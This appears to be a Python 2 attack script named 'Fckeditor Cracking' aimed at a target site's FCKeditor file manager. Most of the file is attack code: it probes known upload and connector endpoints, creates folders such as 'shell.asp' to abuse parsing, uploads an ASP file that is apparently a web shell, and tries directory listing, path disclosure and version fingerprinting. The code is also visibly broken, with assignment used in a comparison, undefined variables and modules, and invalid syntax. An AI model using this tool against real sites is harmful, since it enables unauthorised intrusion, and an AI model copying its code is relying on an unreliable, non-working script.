#!/usr/bin/env python
#coding = utf-8
import re
import urllib
import urllib2
import os
import sys
import httplib
sys.path.append("plugin/")
#import color_pr
import report_template
import time
from poster.streaminghttp import register_openers
from poster.encode import multipart_encode

global url,resp

def response(url,filename):
	#params = urllib.urlencode({"Demon":"test"})
	#headers = {"Content-type":"application/x-www-form-urlencoded"}
	#conn = httplib.HTTPConnection(url)
	#conn.request("POST",filename,params,headers)
	#resp = conn.getresponse()
	resp=urllib.urlopen(url+filename)
	return resp

def shell_handler():
	if response(url,"editor/filemanager/upload/php/upload.php").getcode() = 200:
		upload_url = url+"/editor/filemanager/upload/php/upload.php?Type=Media"
		try:
			upload(upload_url)
		except:
			pass
	elif response(url,"editor/filemanager/connectors/asp/connector.asp?Command=CreateFolder&Type=Image&CurrentFolder=%2Ffold.asp&NewFolderName=z&uuid=1244789975684").getcode() == 200:
		upload_url = url+""
		try:
			upload(upload_url)
		except:
			pass

	elif response(dic,"/editor/filemanager/browser/default/connectors/asp/connector.asp?Command=CreateFolder&CurrentFolder=/&Type=Image&NewFolderName=fold.asp").getcode() == 200:
		upload_url = url+""
		try:
			upload(upload_url)
		except:
			pass
	#elif up_url == page():
		#print up_url
	else:
		pass

#def page():
#	f = open("dic.txt","r")
#	for line in f.readlines():
#		if ############:
#			return line
#		else:
#			return 0

def upload():
	opener = poster.streaminghttp.register_openers()
	opener.add_handler(urllib2.HTTPCookieProcessor(cookielib.CookieJar()))
	params = {'file': open("sysinfo.asp", "rb"), 'name': 'NewFile'}
	datagen, headers = poster.encode.multipart_encode(params)
	request = urllib2.Request(upload_url, datagen, headers)
	result = urllib2.urlopen(request)

def index_of():
	index_urls = ['/editor/filemanager/browser/default/connectors/asp/connector.asp?Command=GetFoldersAndFiles&Type=Image&CurrentFolder=%2F','/editor/filemanager/browser/default/connectors/jsp/connector?Command=GetFoldersAndFiles&Type=&CurrentFolder=%2F','/browser/default/connectors/aspx/connector.aspx?Command=CreateFolder&Type=Image&CurrentFolder=../../..%2F&NewFolderName=shell.asp']
	index_dics = ['Index of','parent dictionary']
	for index_url in index_urls:
		html = urllib.urlopen(url+index_url)
		for index_dic in index_dics:
			pattern = re.compile(index_dic)
			match = html.search(pattern)
			if match:
				print color_pr.red("[!]Fckeditor with a dic xday==>\n"+index_dic+'\n')

def xpath():
	xpath_dics =['FCKeditor/editor/filemanager/browser/default/connectors/aspx/connector.aspx?Command=GetFoldersAndFiles&Type=File&CurrentFolder=/shell.asp','/editor/filemanager/connectors/asp/connector.asp?Command=CreateFolder&Type=File&CurrentFolder=%2F&NewFolderName=aux']
	for xpath_dic in xpath_dics:
		html= urllib.urlopen(site+dic+xpath_dic)
		pattern = re.compile('<p>.*,')
		match = html.search(pattern)
		if match:
			print "[!]Fckeditor xpath may be"+match.group(0)[3,-1]


def info_gather():
	ver_dic={'editor/dialog/fck_about.html':['<b>.*</b><br','4','-7'],'_whatsnew.html':['Ver.*</h3','0','-4'],'editor/_source/fckeditorapi.js':['Version.*,"V','0','-2'],'editor/js/fckeditorcode_gecko.js':['Version.*",V','0','-2'],'editor/js/fckeditorcode_ie.js':['Version.*",V','0','-2']}
	for key in ver_dic:
		html = urllib.urlopen(site+dic+key)
		pattern = re.compile(ver_dic[key][0])
		match = re.search(pattern,html)
		if match:
			print color_pr.green("[!]Fckeditor ===>"+match.group(0)[ver_dic[key][1]:ver_dic[key][2]])
		#else:
			print color_pr.red("[-]Info_gather failed.")
	

if __name__ == "__main__":
	#print sys.argv[1]
	site = sys.argv[1]
	url="http://"+site
	print "||===>url:"+site+"====Fckeditor Cracking====>\n"
	resp = response(url)
	#if resp.status == 403 or 200:
	shell_handler()
	index_of()
	xpath()
	info_gather()
	if file is empty:
		print "[-]Info_gather failed."
		
		#else:
		#print color_pr.yellow("[!]Sorry,<"+site+">may be no chance!")
